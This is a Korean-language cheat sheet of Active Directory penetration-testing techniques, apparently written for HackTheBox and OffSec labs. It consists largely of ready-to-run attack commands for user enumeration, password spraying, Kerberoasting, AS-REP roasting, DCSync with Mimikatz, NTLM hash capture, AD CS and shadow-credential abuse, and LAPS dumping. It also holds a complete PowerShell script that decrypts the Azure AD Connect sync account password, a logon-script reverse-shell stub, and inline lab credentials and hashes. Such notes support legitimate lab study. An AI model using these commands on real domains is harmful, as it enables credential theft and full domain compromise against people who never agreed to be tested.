<details>
  <summary><strong>Logon Script</strong></summary>

- 사용자가 컴퓨터에 로그인하는 순간 자동으로 환경을 세팅해주기 위해 사용.
- 네트워크 드라이브 연결 / 프린터 연결 등.
- AD에서 이 logon 스크립트들은 보통 SYSVOL이라는 공유 폴더에 저장.
```powershell
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "<reverse shell>"
```
  
</details>

---
<details>
  <summary><strong>pre2k</strong></summary>

- Windows 2000 이전 시스템과의 호환성을 위해 만든 정책
- 당시 오래된 클라이언트들이 Kerberos를 못 쓰는 경우를 위한 레거시 옵션
- 초기 생성 시 컴퓨터 이름과 동일한 임시 패스워드가 설정되거나 취약한 인증 기본값이 적용되는 특성
- https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/

### Enumeration
```bash
nxc ldap ip -u user -p password -M pre2k
```

### Abusing
```bash
nxc smb ip -u server$ -p server -k

nxc smb ip -u server$ -p server -k --generate-tgt ticket
```
  
</details>

---
<details>
  <summary><strong>signing</strong></summary>

- `signing:True` : NTLM relay attack 불가.
- `signing:False` : NTLM relay attack 가능.
<img width="1204" height="298" alt="image" src="https://github.com/user-attachments/assets/0db80c51-3ba8-424b-bc5b-3691ed4b2ab0" />

</details>

---
<details>
  <summary><strong>네트워크 스캔 및 호스트 탐색</strong></summary>

### FPing
> 빠른 네트워크 스캔을 위한 도구로, 활성 호스트를 신속하게 식별

```bash
# 172.16.5.0/23 네트워크 범위의 활성 호스트 탐색
fping -asgq 172.16.5.0/23

# 발견된 호스트에 대한 상세 스캔 수행
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```  
  
</details>

---
<details>
  <summary><strong>사용자 열거</strong></summary>

### Kerbrute
> Kerberos 프로토콜을 이용한 유효한 도메인 사용자 계정 열거

```bash
# 통계적으로 가능성 높은 사용자명 리스트 다운로드
git clone https://github.com/insidetrust/statistically-likely-usernames

# 유효한 AD 사용자 열거 (jsmith.txt 또는 jsmith2.txt 사용)
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

# Kerberos를 통한 사용자명 유효성 확인
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Enum4linux
> SMB/LDAP를 통한 도메인 사용자 정보 수집

```bash
# 도메인 사용자 목록 추출 및 정리
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### CrackMapExec
> 다목적 AD 공격 도구 - 사용자 열거
> mssql 로그인의 경우 --local-auth를 사용.

```bash
# SMB를 통한 사용자 열거
crackmapexec smb 172.16.5.5 --users

netexec smb <ip> -u 'guest' -p '' --rid-brute

nxc mssql -u <user> -p <pass> --rid-brute
```

### LDAP Search
> LDAP 프로토콜을 이용한 사용자 계정 검색

> 특별한 정보만 확인하지 말고 전체 다 확인해야 한다.

> `dn(Distingushed Name)`을 확인해서 해당 객체가 어느 도메인/부서에 속하는지 확인할 수 있다.

```bash
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.160.122" "(objectclass=*)"

ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.160.122" "(objectclass=person)"

ldapsearch -v -x -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" -H "ldap://10.129.230.181" "(objectclass=*)"

# LDAP 쿼리를 통한 사용자 계정 추출
ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

```bash
# 수집된 정보에서 특별한 정보 찾기.
cat ldap| awk '{print $1}'|sort|uniq -c|sort -nr
```

### Windapsearch
> Windows Active Directory LDAP 검색 도구

```bash
# 익명 인증을 통한 사용자 열거
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


### RPCclient
> RPC를 통한 도메인 사용자 열거

```bash
# 널 세션을 통한 RPC 연결
rpcclient -U "" -N 172.16.5.5

# 도메인 사용자 열거
rpcclient $> enumdomusers

# Display Query Information
rpcclient $> querydispinfo
```
  
</details>

---
<details>
  <summary><strong>네트워크 공격</strong></summary>

### Responder
> LLMNR, NBT-NS, MDNS 스푸핑을 통한 자격증명 수집 (Linux)

```bash
# Responder 실행 - 네트워크 트래픽 모니터링 및 스푸핑
sudo responder -I tun0 -v
```

### Inveigh
> LLMNR, NBT-NS, MDNS 스푸핑을 통한 자격증명 수집 (Windows/PowerShell)

```powershell
# Inveigh 실행
.\inveigh.exe

# Inveigh 콘솔에서 ESC + ENTER 입력 후 명령어 실행

# 캡처된 고유 NTLMv2 해시 확인
GET NTLMV2UNIQUE

# 캡처된 사용자명 목록 확인
GET NTLMV2USERNAMES
```
  
</details>

---
<details>
  <summary><strong>패스워드 정책 확인</strong></summary>

### CrackMapExec
> SMB를 통한 도메인 패스워드 정책 확인

```bash
# 유효한 자격증명을 이용한 패스워드 정책 조회
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### RPCclient
> RPC를 통한 도메인 및 패스워드 정보 조회

```bash
# 널 세션으로 RPC 연결
rpcclient -U "" -N 172.16.5.5

# 도메인 정보 조회
rpcclient $> querydominfo

# 패스워드 정책 정보 조회
rpcclient $> getdompwinfo
```

### Enum4linux
> 도메인 패스워드 정책 수집

```bash
# 패스워드 정책 열거
enum4linux -P 172.16.5.5

# 차세대 enum4linux를 이용한 정보 수집 및 출력 파일 생성
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

### Windows 네트워크 명령어
> 널 세션 연결 (Windows)

```powershell
# IPC$ 공유에 널 세션 연결
net use \\DC01\ipc$ "" /u:""
```

### LDAP Search (패스워드 정책)
> LDAP를 통한 패스워드 히스토리 길이 확인

```bash
# 패스워드 히스토리 설정 확인
ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Windows 로컬 명령어
> 로컬 계정 정책 확인

```powershell
# 계정 정책 정보 조회
net accounts
```

### PowerView
> PowerShell 기반 AD 열거 도구 - 도메인 정책 확인

```powershell
# PowerView 모듈 가져오기
import-module .\PowerView.ps1

# 도메인 정책 조회
Get-DomainPolicy
```
  
</details>

---
<details>
  <summary><strong>패스워드 스프레이 공격</strong></summary>

> 계정 잠금을 피하면서 여러 계정에 동일한 패스워드를 시도하는 공격

### Bash 스크립트 기반 스프레이
```bash
# RPCclient를 이용한 패스워드 스프레이 (성공한 인증만 표시)
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Kerbrute
```bash
# Kerberos 인증을 이용한 패스워드 스프레이
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### CrackMapExec
```bash
# SMB를 통한 패스워드 스프레이 (성공한 인증만 표시)
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# KERBEROS
nxc smb <FQDN> -u <user> -p <pass> -k
```
- `KERBEROS` 인증을 시도할 경우 `IP` 대신 `FQDN`을 사용해야 한다.

### DomainPasswordSpray (PowerShell)
> PowerShell 기반 패스워드 스프레이 도구

```powershell
# DomainPasswordSpray 모듈 가져오기
Import-Module .\DomainPasswordSpray.ps1

# 패스워드 스프레이 수행 및 성공 결과 파일 저장
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
  
</details>

---
<details>
  <summary><strong>자격증명 열거</strong></summary>

> 유효한 자격증명을 획득한 후 도메인 정보 수집

### CrackMapExec (다양한 열거)
```bash
# 도메인 사용자 열거
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# 도메인 그룹 열거
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# 로그온된 사용자 확인
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# SMB 공유 열거
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider Plus 모듈을 이용한 공유 폴더 크롤링
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

### SMBMap
> SMB 공유 매핑 및 파일 시스템 탐색

```bash
# SMB 공유 열거
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# 특정 공유의 디렉토리 구조 탐색 (디렉토리만 표시)
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

### RPCclient (상세 사용자 정보)
```bash
# 널 세션으로 RPC 연결
rpcclient -U "" -N 172.16.5.5

# 도메인 사용자 열거
rpcclient $> enumdomusers

# 특정 사용자의 상세 정보 조회 (RID: 0x457)
rpcclient $> queryuser 0x457
```

### Impacket (원격 실행)
> PSExec 및 WMIExec를 이용한 원격 명령 실행

```bash
# PSExec를 이용한 원격 쉘 획득
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

# WMIExec를 이용한 원격 명령 실행
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

### Windapsearch (권한 있는 계정 찾기)
```bash
# Domain Admins 그룹 멤버 조회
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# 권한 있는 사용자(Privileged Users) 조회
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### BloodHound
> 그래프 기반 AD 관계 분석 도구 - Python 인제스터

```bash
# BloodHound 데이터 수집 (모든 정보)
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### Active Directory PowerShell 모듈
> Windows에서 기본 제공되는 AD 관리 모듈

```powershell
# Active Directory 모듈 가져오기
Import-Module ActiveDirectory

# 로드된 모듈 확인
Get-Module

# 도메인 정보 조회
Get-ADDomain

# SPN이 설정된 사용자 계정 찾기 (Kerberoastable 계정)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# 도메인 트러스트 관계 확인
Get-ADTrust -Filter *

# 모든 그룹 이름 조회
Get-ADGroup -Filter * | select name

# 특정 그룹 정보 조회
Get-ADGroup -Identity "Backup Operators"

# 그룹 멤버 조회
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView
> PowerShell 기반 AD 열거 및 정찰 도구

```powershell
# PowerView 모듈 가져오기
import-module powerview.ps1

# 특정 사용자의 상세 정보 조회
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Domain Admins 그룹 멤버 재귀적 조회
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# 도메인 트러스트 매핑
Get-DomainTrustMapping

# 특정 컴퓨터에 대한 관리자 접근 권한 테스트
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# SPN이 설정된 사용자 계정 찾기
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView
> PowerView의 C# 포팅 버전

```powershell
# 특정 사용자 정보 조회
.\SharpView.exe Get-DomainUser -Identity forend
```

### Snaffler
> 네트워크 공유에서 민감한 정보 자동 검색

```powershell
# 도메인 전체에서 민감한 데이터 검색
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

### SharpHound
> BloodHound 데이터 수집 도구 (Windows 네이티브)

```powershell
SharpHound.exe -d 도메인.com --ldapusername 유저 --ldappassword 패스워드

# 모든 AD 정보 수집 및 ZIP 파일로 저장
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

**BloodHound 유용한 쿼리:**
- `Find Computers with Unsupported Operating Systems` - 지원 종료된 OS 찾기
- `Find Computers where Domain Users are Local Admin` - Domain Users가 로컬 관리자인 컴퓨터 찾기
  
</details>

---
<details>
  <summary><strong>AS-REP Roasting</strong></summary>

- Kerberos 사전 인증(Pre-authentication)이 비활성화된 계정이 존재
- 인증 없이 암호화된 AS-REP 응답을 획득하여 오프라인에서 비밀번호를 크랙하는 공격
- 인증이 필요없기 때문에 `Kerberoasting`이전에 시도.

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete

impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
```
```powershell
.\Rubeus.exe asreproast /nowrap
```

  
</details>

---
<details>
  <summary><strong>Kerberoasting 공격</strong></summary>

> SPN이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 크래킹

### Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```bash
sudo timedatectl set-ntp off

sudo ntpdate <ip>
```

### GetUserSPNs (Impacket)
> 리눅스에서 Kerberoasting 수행

```bash
# 특정 사용자의 TGS 티켓 요청 및 해시 저장
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

# username만 아는 상태로 시도.
impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user> -no-pass

./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

### PowerView
> PowerShell 기반 Kerberoasting

```powershell
# PowerView 모듈 가져오기
Import-Module .\PowerView.ps1

# SPN이 있는 모든 사용자의 TGS 티켓 요청 및 CSV로 저장
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Rubeus
> C# 기반 Kerberos 공격 도구
```powershell
# 현재 사용자의 티켓을 base64로 출력.
.\rubeus.exe tgtdeleg /nowrap

# 현재 사용자의 계정으로 커버로스팅 공격 시도.
.\Rubeus.exe kerberoast /nowrap
```

```powershell
# Kerberoasting 가능한 계정 통계 확인
.\Rubeus.exe kerberoast /stats

# admincount=1 속성을 가진 계정만 타겟팅
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# 특정 사용자 타겟팅 (TGT 위임 사용)
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```
  
</details>

---
<details>
  <summary><strong>DCSync 공격</strong></summary>

> Domain Controller를 모방하여 도메인 자격증명 덤프

### Secretsdump (Impacket)
> 원격으로 도메인 자격증명 덤프

```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds

# DC로부터 모든 해시 덤프 (DCSync 권한 필요)
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

### Mimikatz
> Windows에서 DCSync 수행

```powershell
# 특정 사용자로 PowerShell 실행 (network-only 로그온)
runas /netonly /user:INLANEFREIGHT\adunn powershell

# Active Directory 모듈 가져오기
Import-Module ActiveDirectory

# 역방향 암호화가 허용된 사용자 찾기
Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} -Properties AllowReversiblePasswordEncryption | Select-Object SamAccountName, Name

# Mimikatz 실행
.\mimikatz.exe

# 디버그 권한 활성화
mimikatz # privilege::debug

# DCSync로 관리자 계정의 자격증명 덤프
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
  
</details>

---
<details>
  <summary><strong>횡적 이동 (Lateral Movement)</strong></summary>

### RDP (Remote Desktop Protocol)

**BloodHound Cypher 쿼리:**
```cypher
# RDP 접근 가능 경로 찾기
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2
```

**PowerView:**
```powershell
# PowerView 모듈 가져오기
. .\powerview.ps1

# 특정 컴퓨터의 Remote Management Users 그룹 멤버 확인
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# 모든 도메인 컴퓨터의 Remote Management Users 그룹 멤버 확인
Get-DomainComputer | ForEach-Object {Get-NetLocalGroupMember -ComputerName $_.dnshostname -GroupName "Remote Management Users"}
```

### MSSQL (Microsoft SQL Server)

**BloodHound Cypher 쿼리:**
```cypher
# SQL 관리자 권한 경로 찾기
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) 
RETURN p2
```

**PowerUpSQL:**
```powershell
# PowerUpSQL 디렉토리로 이동
cd .\PowerUpSQL\

# PowerUpSQL 모듈 가져오기
Import-Module .\PowerUpSQL.ps1

# 도메인 내 SQL 인스턴스 발견
Get-SQLInstanceDomain

# SQL 쿼리 실행 (인증된 접근)
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

**Impacket mssqlclient:**
```bash
# Windows 인증을 사용한 MSSQL 연결
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

</details>

---
<details>
  <summary><strong>BloodHound</strong></summary>

- 도메인에 속해 있는 상태라면 `Sharphound`를 사용하여 수집이 가능하다.
- 공격 대상을 `Administrator`로 잡고 시작. 만약에 찾지 못했다면 도메인 컴퓨터로 확인.
- `SharpHound`를 먼저 써보기.
- `rusthound`도 추가적으로 실행해서 수집.
- Shortest Paths to Domain Admins
- Enrollment rights on certificate templates

## bloodhound-python
```bash
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.208.40
```

## rusthound
```bash
rusthound-ce -d tombwatcher.htb -u john -p password
```


## SharpHound
```powershell
SharpHound.exe -d 도메인.com --ldapusername 유저 --ldappassword 패스워드
```
  
</details>

---
<details>
  <summary><strong>Azure AD Connect</strong></summary>

- https://blog.xpnsec.com/azuread-connect-for-redteam/

## 조건
- `AD` 환경에서 `AZURE` 서비스를 사용중이어야 한다.
- Azure AD Connect (AD Sync 서비스) 가 내부적으로 LocalDB 또는 MSSQL을 사용.
- 우선적으로 `MSSQL` 취약점을 탐색.
- `AAD_987d7f2f57d2`

## Recon
```powershell
# 서비스 확인
Get-Service -Name "ADSync" -ErrorAction SilentlyContinue

# 설치 경로 확인
Test-Path "C:\Program Files\Microsoft Azure AD Sync"

# 버전 확인
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Azure AD Connect"
```

## MSOL 추출
- `MSOL` : Azure AD Connect가 온프레미스 Active Directory와 Azure AD(Microsoft 365/Entra ID) 간의 동기화를 수행하기 위해 자동으로 생성하는 서비스 계정
```powershell
# ========================================
# Azure AD Connect MSOL 계정 추출 스크립트
# ========================================

# 환경 자동 탐지 및 연결
function Get-ADSyncConnection {
    # 1. LocalDB 먼저 시도
    try {
        Write-Host "[*] Trying LocalDB connection..." -ForegroundColor Yellow
        $localDBConn = "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
        $testClient = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $localDBConn
        $testClient.Open()
        $testClient.Close()
        Write-Host "[+] LocalDB found!" -ForegroundColor Green
        return $localDBConn
    } catch {
        Write-Host "[-] LocalDB not available" -ForegroundColor Red
    }

    # 2. 전체 SQL Server 시도
    try {
        Write-Host "[*] Trying full SQL Server connection..." -ForegroundColor Yellow
        $sqlServerConn = "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
        $testClient = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $sqlServerConn
        $testClient.Open()
        $testClient.Close()
        Write-Host "[+] SQL Server found!" -ForegroundColor Green
        return $sqlServerConn
    } catch {
        Write-Host "[-] SQL Server not available" -ForegroundColor Red
    }

    throw "No SQL connection available"
}

# 메인 실행
try {
    # 자동으로 적절한 연결 문자열 선택
    $connectionString = Get-ADSyncConnection
    
    Write-Host "`n[*] Connecting to database..." -ForegroundColor Yellow
    $client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $connectionString
    $client.Open()
    
    # 키 정보 추출
    Write-Host "[*] Extracting encryption keys..." -ForegroundColor Yellow
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $key_id = $reader.GetInt32(0)
    $instance_id = $reader.GetGuid(1)
    $entropy = $reader.GetGuid(2)
    $reader.Close()
    
    # 암호화된 설정 추출
    Write-Host "[*] Extracting encrypted configuration..." -ForegroundColor Yellow
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
    $reader = $cmd.ExecuteReader()
    
    if (-not $reader.Read()) {
        throw "No AD management agent found"
    }
    
    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()
    $client.Close()
    
    # mcrypt.dll 로드 및 복호화
    Write-Host "[*] Decrypting password..." -ForegroundColor Yellow
    $mcryptPath = 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
    
    if (-not (Test-Path $mcryptPath)) {
        throw "mcrypt.dll not found at $mcryptPath"
    }
    
    Add-Type -Path $mcryptPath
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    $key = $null
    $km.GetActiveCredentialKey([ref]$key)
    $key2 = $null
    $km.GetKey(1, [ref]$key2)
    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
    
    # 자격증명 파싱
    Write-Host "[*] Parsing credentials..." -ForegroundColor Yellow
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | 
              select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | 
                select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | 
                select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
    
    # 결과 출력
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "MSOL Account Credentials" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ("Domain:   " + $domain.Domain) -ForegroundColor Green
    Write-Host ("Username: " + $username.Username) -ForegroundColor Green
    Write-Host ("Password: " + $password.Password) -ForegroundColor Green
    Write-Host "========================================`n" -ForegroundColor Cyan
    
} catch {
    Write-Host "`n[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Red
} finally {
    if ($client -and $client.State -eq 'Open') {
        $client.Close()
    }
}
```

</details>

---
<details>
  <summary><strong>AD Recycle Bin Group(Restore deleted AD objects)</strong></summary>

## Find deleted Objects
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=ad%20recycle%20bin#ad-recycle-bin
```powershell
# Object 존재 확인
Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"

# 삭제 되었는지 확인
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDeletedObjects

# Recycle Bin 기능 확인
Get-ADOptionalFeature 'Recycle Bin Feature'
```

## Restore
```powershell
Restore-ADObject -Identity <ObjectGUID>
```
  
</details>

---
<details>
  <summary><strong>Kerberos Ticket Authentication(KRB5CCNAME)</strong></summary>

## Ticket 변환
```bash
# kirbi 파일을 ccache로 변환(base64 인코딩 되어있으면 디코딩)
impacket-ticketConverter ticket.kirbi ticket.ccache

impacket-ticketConverter ticket.ccache ticket.kirbi
```

## 환경변수 설정
```bash
export KRB5CCNAME=/path/to/ticket.ccache
```

## 인증
```bash
# KRB5CCNAME 사용하여 psexec 실행
psexec.py -k -no-pass DOMAIN/USER@<FQDN>

# 해시 탈취
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
```
  
</details>

---
<details>
  <summary><strong>WriteOwner</strong></summary>

- `WriteOwner`권한만으로는 공격이 실패.
- 소유자로 만들어 주는 과정이 필요.
```bash
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan

bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan

# Shadow Credentail
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```

## KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
- 해당 오류가 발생하여 `certipy-ad`가 제대로 실행이 되지 않으면 `bloodyAD`를 사용하여 비밀번호 변경 시도.
- 혹은 `ldap-shell` 옵션 사용해보기.
```bash
bloodyAD -d tombwatcher.htb -u sam -p password --host dc01.tombwatcher.htb set password john password
```
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
```
  
</details>

---
<details>
  <summary><strong>AD CS(CA)</strong></summary>

- 보안의 이유로 관리자급의 유저에게 인증서를 통해서 로그인을 하도록 하는 시스템.
- PKINIT 로그인을 허용해야 가능.
- 설정을 잘못할시에 악용이 가능.
- `vulnerable` 옵션을 주지 않고 열거는 모든 유저로도 가능.
- 공격을 시도할 때는 권한이 있는 유저로만 가능. 단, Domain Users 전체에 권한이 열려있으면 일반 유저로도 공격 가능.
- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

### Abusing
```powershell
# Sid 찾기
Get-ADUser administrator
```
```bash
certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable

certipy-ad find -u <user> -p <password> -target <domain/FQDN> -text -stdout -vulnerable

# 인증 시도
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
```
<img width="1086" height="113" alt="image" src="https://github.com/user-attachments/assets/eed34f42-f4ac-4233-b3a8-1c2fa0cdb9a8" />
<img width="1086" height="53" alt="image" src="https://github.com/user-attachments/assets/76523c8e-8f08-47c1-81cf-360ec9f046f4" />


### key size error
- `certipy`에서 `-key-size`옵션으로 해결.

### PKINIT 인증 불가
- `DC`에 인증서가 없을 경우 `PKINIT` 인증이 불가.
- `PFX`파일 내부에 인증서와 개인키가 모두 포함되어 있어 `LDAPS`인증 가능.


</details>

---
<details>
  <summary><strong>GenericWrite(Shadow CRedentials attack)</strong></summary>

```bash
# 다른 계정도 시도해보아야 한다 
certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account 'winrm_svc' -dc-ip 10.129.232.88 -target-ip 10.129.232.88
certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account 'ca_svc' -dc-ip 10.129.232.88 -target-ip 10.129.232.88

```


</details>

---
<details>
  <summary><strong>dnstool</strong></summary>

- **Active Directory 통합 DNS에 레코드를 동적으로 추가/수정/삭제**할 수 있는 도구
- 가짜 DNS를 생성하여 해시 탈취가 가능.
- `DNS`를 사용하여 인증을 시도하는 코드.
```powershell
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
}
```

<br>

```bash
dnstool -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-test --data 10.10.14.23 --type A 10.129.95.154

# DNS 등록 후 responder 사용
sudo responder -I tun0 -v
```
  
</details>

---
<details>
  <summary><strong>getST</strong></summary>

- `Service Principal Names`에 `HOST/dc.intelligence.htb`가 존재하면 `WWW/dc.intelligence.htb` 혹은 `HTTP/dc.intelligence.htb`도 사용 가능하다.
```bash
impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -altservice 'cifs' -hashes :0d5463c6e805b0908b61e90cf9219dc3 intelligence.htb/'svc_int$'
```

</details>

---
<details>
  <summary><strong>STATUS_ACCOUNT_DISABLED</strong></summary>

<img width="1203" height="122" alt="image" src="https://github.com/user-attachments/assets/42bdf65d-8ddd-467e-a4d3-5f413e2f4810" />
<img width="495" height="625" alt="image" src="https://github.com/user-attachments/assets/e0df2f61-bc4e-43e7-a8cf-466608ec0c60" />


```bash
bloodyAD -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 -d puppy.htb remove uac -f ACCOUNTDISABLE adam.silver
```
  
</details>

---
<details>
  <summary><strong>bloodyAD</strong></summary>

- 레거시에서는 `net rpc`가 작동하나 최신 AD 환경에서는 작동하지 않아 `bloodyAD`를 사용.
```bash
bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember infrastructure alfred

bloodyAD -d tombwatcher.htb -u ansible_dev$ -p 93f81a98d22217b6206d950528a4802e:93f81a98d22217b6206d950528a4802e --host dc01.tombwatcher.htb set password sam password
```
  
</details>

---
<details>
  <summary><strong>ntlm_theft(Upload File to capture hash)</strong></summary>

- https://github.com/Greenwolf/ntlm_theft
- `SMB`에 쓰기 권한이 있을 때 특정 파일 형식으로 업로드를 하면 윈도우가 자체적으로 렌더링을 하기 위해서 네트워크 경로를 탐색하는 과정에서 NTLM 해시가 추출됨.
```bash
python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
```
  
</details>

---
<details>
  <summary><strong>ReadLAPSPassword</strong></summary>

- `nxc`를 사용해서 침투 가능.
```bash
nxc smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```
  
